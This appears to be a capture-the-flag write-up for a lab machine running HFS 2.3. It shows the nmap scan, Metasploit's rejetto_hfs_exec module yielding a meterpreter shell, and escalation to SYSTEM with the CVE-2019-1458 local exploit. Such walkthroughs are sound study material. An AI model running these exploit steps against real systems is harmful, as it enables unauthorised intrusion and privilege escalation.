# Solution

Usual nmap scan on the machine:
```
>nmap -sC -sV -oN nmap-initial 10.10.10.8
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-29 12:32 CET
Nmap scan report for 10.10.10.8
Host is up (0.17s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

The service on port 80 is a HTTP File Server used to send and receive files through a web interface.  
HFS version 2.3 is vulnerable to remote code execution.  
We select the correct metasploit module:
```
use windows/http/rejetto_hfs_exec
```

We set the options and target and we run the exploit. In this way we get a meterpreter shell.  
We check under what user we're running the shell:
```
> getuid
OPTIMUM\kostas
```

The user flag is in the same directory. Now we are supposed to escalate the privileges to root in order to get the root flag.

We run a meterpreter post module to scan for possible vulnerabilities in the system.
```
>meterpreter > run post/multi/recon/local_exploit_suggester                                                                                                                                                                                 
                                                                                                                                                                                                                                           
[*] 10.10.10.8 - Collecting local exploits for x64/windows...                                                                                                                                                                              
[*] 10.10.10.8 - 20 exploit checks are being tried...                                                                                                                                                                                      
[+] 10.10.10.8 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.                                                                                                                                     
[+] 10.10.10.8 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.                         
[+] 10.10.10.8 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
```

We can see that the machine may be vulnerable to some attacks.  
We try the exploit for cve_2019_1458.
```
use exploit/windows/local/cve_2019_1458_wizardopium
```
We then set the options and run it. We manage to get SYSTEM privileges.  
We can now find the flag inside of root.txt in the Desktop of the Administrator.
